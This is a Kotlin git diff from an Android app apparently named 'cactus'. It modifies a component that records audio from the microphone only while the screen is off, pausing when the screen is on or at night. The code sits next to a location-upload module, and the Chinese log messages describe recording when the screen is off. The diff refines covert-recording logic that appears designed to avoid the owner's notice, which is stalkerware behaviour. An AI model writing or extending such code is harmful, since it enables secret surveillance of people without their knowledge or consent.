@@ -11,6 +11,7 @@ import androidx.annotation.RequiresApi
 import com.zhu.cactus.App
 import com.zhu.cactus.location.uploadAddress
 import com.zhu.cactus.method.NetworkCallbackImpl
+import com.zhu.cactus.utils.getCurrentTime
 import com.zhu.cactus.utils.isApkInDebug
 
 class network : component_impl {
@@ -67,21 +68,22 @@ class record_audio : component_impl{
 
                 while (true) {
 
-                    if(powerManager.isInteractive) {
-                        Log.d("录音","开屏停止，sleep 5s ")
+                    if( getCurrentTime() || powerManager.isInteractive ) { // 晚上，不录
+                        Log.d("录音","开屏停止，sleep 15s ")
                         audioRecord.stopRecord()//停止录音
-                        Thread.sleep(5000)
+                        Thread.sleep(15000)
                     }
                     else{
                         Log.d("录音","息屏录音")
                         audioRecord.startRecord()//开始录音
+                        Thread.sleep(60000*5)// 五分钟检查一次
                     }
 
                 }
 
 
             }
-        }
+        }.run()
     }
 
 }
